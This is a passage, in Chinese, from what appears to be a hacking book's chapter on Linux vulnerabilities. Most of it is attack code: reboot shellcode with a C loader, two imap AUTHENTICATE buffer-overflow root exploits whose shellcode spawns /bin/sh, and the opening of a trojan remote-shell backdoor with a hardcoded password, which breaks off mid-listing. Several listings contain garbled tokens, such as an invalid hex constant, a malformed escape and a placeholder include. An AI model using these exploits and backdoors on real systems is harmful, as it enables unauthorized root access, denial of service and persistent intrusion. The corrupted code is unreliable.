

PowerMac、ARM、MIPS、富士通计算机系统以及更多。Linux 被评为当今市场上最流行的操作系统之一。此外，Linux 还包括真正的多任务处理、虚拟内存、共享库、内存管理、TCP/IP 网络以及更多功能。

目前，Linux 被许多供应商定制、打包和分发，包括：RedHat Linux (www.redhat.com)、Slackware (www.slackware.org)、Debian (www.debian.org)、TurboLinux (www.turbolinux.com)、Mandrake (www.linux-mandrake.com)、SuSE (www.suse.com)、Trinux (www.trinux.org)、MklLinux (www.mklinx.org)、LinuxPPC (www.linuxppc.org)、SGI Linux (http://oss.sgi.com/projects/sgiunix11)、Caldera OpenLinux (www.caldera.com)、Corel Linux (http://linux.corel.com) 和 Stampede Linux (www.stampede.org)。

对本次讨论而言，也许最重要的是 Linux 源代码向公众免费开放；因此，它催生了广泛的专有程序开发。这种大规模增长的缺点在于存在大量不安全因素，其中许多具有破坏性。事实上，仅针对 Linux 漏洞就可以写成一整本书；然而，篇幅限制使得这里只能描述一些最常见的安全漏洞。请注意；普通的 TigerBox 基础架构始于 Linux 操作系统。

## 重新启动

**概述：** 一种几乎可以重启任何 Linux x86 机器的远程攻击。

**攻击状态：** 系统停机/重启。

**漏洞：** 所有版本。

**入侵文件：** Reboot.asm。

### Reboot.asm

```asm
jmp rootshell
coded_by_bmv:
    popl %edi
    call rebo0t
rootshell:
    call coded_by_bmv
rebo0t:
    xorl %eax,%eax
    movb $0x24,%eax
    int $0x80
    xorl %eax,%eax
    movb $0x58,%eax
    movl $0xfeeldead,%ebx
    movl $672274793,%ecx
    movl $0x1234567,%edx
    int $0x80
    xorl %eax,%eax
    movb $0x01,%al
    int $0x80
```

```c
char shellcode[]=
"\xeb\x06\x5f\xe8\x05\x00\x00\x00\xe8\xf5\xff"
"\xff\xff\xf31\xc0\xb0\x24\xcd\x80\x31\xc0\xb0"
"\x58\xbb\xad\xde\xe1\xfe\xb9\x69\x19\x12\x28"
"\xba\x67\x45\x23\x01\xcd\x80\x31\xc0\xb0\x01"
"\xcd\x80\x89\xec\x5d\xc3";

void main()
{
int *ret;
ret = (int *)&ret + 2;
(*ret) = (int)shellcode;
}
```

## 远程 Root 攻击

**概述：** 一种暴力破解的远程 root 攻击，几乎适用于任何 Linux 机器。

**攻击状态：** 未授权的 root 访问权限。

**漏洞：** 所有版本。

**入侵文件：** linroot.c。

### linroot.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <string.h>

#define BUFLEN 2048
#define NOP 0x90

char shell[] =
```

```asm
/*
jmp 56
popl %esi
movl    %esi,%ebx
movl    %ebx,%eax

addb    $0x20,0x1(%esi)
addb    $0x20,0x2(%esi)
addb    $0x20,0x3(%esi)
addb    $0x20,0x5(%esi)
addb    $0x20,0x6(%esi)

movl    %esi,%edi
addl    $0x7,%edi
xorl    %eax,%eax
stosb   %al,%es:(%edi)

movl %edi,%ecx
movl %esi,%eax
stosl %eax,%es:(%edi)
movl %edi,%edx
xorl %eax,%eax
stosl %eax,%es:(%edi)
movb $0x8,%al
addd $0x3,%al
int $0x80
xorl %ebx,%ebx
movl %ebx,%eax
incl %eax
int $0x80
call -61
.string "/BIN/SH"
.byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff ;markup
*/
```

```c
"\xeb\x38\x5e\x89\xf3\x89\xd8\x80"
"\x46\x01\x20\x80\x46\x02\x20\x80"
"\x46\x03\x20\x80\x46\x05\x20\x80"
"\x46\x06\x20\x89\xf7\xc7\x07"

"\x31\xc0\xaa\x89\xf9\x89\xf0\xab"
"\x89\xfa\x31\xc0\xab\xb0\x08\x04"
"\x03\xcd\x80\x31\xd8\x89\xd8\x40"
"\xcd\x80\x8e\xc3\xff\xff\xff\x2f"
"\x42\x49\x4e\x2f\x53\x48\x00"

void
main (int argc, char *argv[]) {
  char buf[BUFLEN];
  int offset=0,nop,i;
  unsigned long esp;

  fprintf(stderr,"usage: %s <offset>\n", argv[0]);

  nop = 403;
  esp = 0xbffff520;
  if(argc>1)
    offset = atoi(argv[1]);

  memset(buf, NOP, BUFLEN);
  memcpy(buf+(long)nop, shell, strlen(shell));

  for (i = 512; i < BUFLEN - 4; i += 4)
    *(int *) &buf[i] = esp + (long) offset;

  printf("* AUTHENTICATE (%d) \r\n", BUFLEN);
  for (i = 0; i < BUFLEN; i++)
    putchar(buf[i]);

printf("\r\n");
return;
}
```

## 远程 Root 攻击

**概述：** 另一种 *imap* 远程 root 攻击，几乎适用于任何 Linux 机器。

**攻击状态：** 未授权的 root 访问权限。

**漏洞：** 所有版本。

**入侵文件：** *imaprev.c*。

### Imaprev.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <string.h>

#define BUFLEN  (2*1024)
#define NOP 0x90

char shell[] =
"\xeb\x34\x5e\x8d\x1e\x89\x5e\x0b\x31\x2d\x89\x56\x07"
"\x89\x56\x0f\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\xf7"
"\x20\x46\x01\x20\x46\x02\x20\x46\x03\x20\x46\x05\x20\x46\x06"
"\xb0\x3b\x8d\x4e\x0b\x89\xca\x52\x51\x53\x50\xeb\x18\x8e\xc0\x7f\xff\x"
"\x2f\xe2\xe9\xee\x2f\xf3\xe8\x01\x01\x01\x01\x02\x02\x02\x02"
"\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

char buf[BUFLEN];
unsigned long int nop, esp;
long int offset;

void
main (int argc, char *argv[])
{
       int i;

       nop = 403; offset = 100;
       if (argc > 2) nop = atoi(argv[2]);
       if (argc > 1) offset = atoi(argv[1]);
       esp = 0xbffff501;

       memset (buf, NOP, BUFLEN);
       memcpy (buf+nop, shell, strlen(shell));
       for (i = nop+strlen(shell); i < BUFLEN - 4; i += 4)
               *((int *) &buf[i]) = esp + offset;

		printf("* AUTHENTICATE ( %d) \r\n", BUFLEN);
		for (i = 0; i < BUFLEN; i++)
			putchar(buf[i]);
		printf("\r\n");
	return;
}
```

## 特洛伊木马远程 Shell

**概述：** 一种常见的特洛伊木马式远程 shell 攻击，几乎适用于任何 Linux 机器。

**攻击状态：** 未授权的 shell 访问权限。

**漏洞：** 所有版本。

**入侵文件：** troshell.c。

### troshell.c

```c
#include <Inc Mods>

#define    QLEN         5
#define    MY_PASSWORD    "wank"
#define    SERV_TCP_PORT  2400    /* 我将在此端口监听连接 */

char sbuf[2048], cbuf[2048];
extern int errno;
extern char *sys_errlist[];
void reaper();
int main();
void telcli();

char BANNER1[] = "\r\n\r\nSUNOS UNIX (";
     BANNER2[] = ")\r\n\r\0x\r\n\0";

#define  OPT_NO           0    /* 不会执行此选项 */
#define  OPT_YES          1    /* 会执行此选项 */
#define  OPT_YES_BUT_ALWAYS_LOOK  2
#define  OPT_NO_BUT_ALWAYS_LOOK  3
char  hisopts[256];
char  myopts[256];

char  doopt[] = {  IAC, DO,   '%', 'c', 0 };
char  dont[]  = {  IAC, DONT, '%', 'c', 0 };
char  will[]  = {  IAC, WILL, '%', 'c', 0 };
char  wont[]  = {  IAC, WONT, '%', 'c', 0 };

/*
 * I/O 数据缓冲区、指针和计数器。
 */
char  ptyiub[BUFSIZE], *ptyip = ptyiub;

char ptyobuf[BUFSIZ], *pfrontp = ptyobuf, *pbackp = ptyobuf;

char netibuf[BUFSIZ], *netip = netibuf;
#define NIACCUM(c) { *netip++ = c; \
 ncc++; \
}

char netobuf[BUFSIZ], *nfrontp = netobuf, *nbackp = netobuf;
char *neturg = 0; /* 紧急数据最后一个 bye 之后的位置 */
/* 远程系统似乎不是旧版的 4.2 */
int not42 = 1;

/* 子选项缓冲区 */
char subbuffer[100], *subpointer= subbuffer, *subend= subbuffer;
#define SB_CLEAR() subpointer = subbuffer;

#define SB_TERM() { subend = subpointer; SB_CLEAR(); }
#define SB_ACCUM(c) if (subpointer < (subbuffer+sizeof subbuffer)
) { \
 *subpointer++ = (c); \
}
#define SB_GET() ((*subpointer++)&0xff)
#define SB_EOF() (subpointer >= subend)

int pcc, ncc;

int pty, net;
int inter;
extern char **environ;
extern int errno;
char *line;
int SYNCHing = 0; /* 我们处于 TELNET SYNCH 模式 */
/*
 * 以下是一些时钟变量，用于决定如何解释各种变量之间的关系。
 */
struct {
 int system, /* 当前时间 */
 echotoggle, /* 用户最后一次输入回显字符的时间 */
 modenegotiated, /* 最后一次运行模式协商的时间 */
 didnetreceive, /* 最后一次从网络读取数据的时间 */
 ttypeopt, /* 接收 ttype will/won't 的时间 */
 ttypesubopt, /* 接收 ttype subopt 的时间 */
 getterminal, /* 开始获取终端信息的时间 */
 gotDM; /* 最后一次看到数据标记的时间 */
} clocks;

#define settimer(x) (clocks.x = ++clocks.system)
#define sequenceIs(x,y) (clocks.x < clocks.y)

char *terminaltype = 0;
char *envinit[2];
```

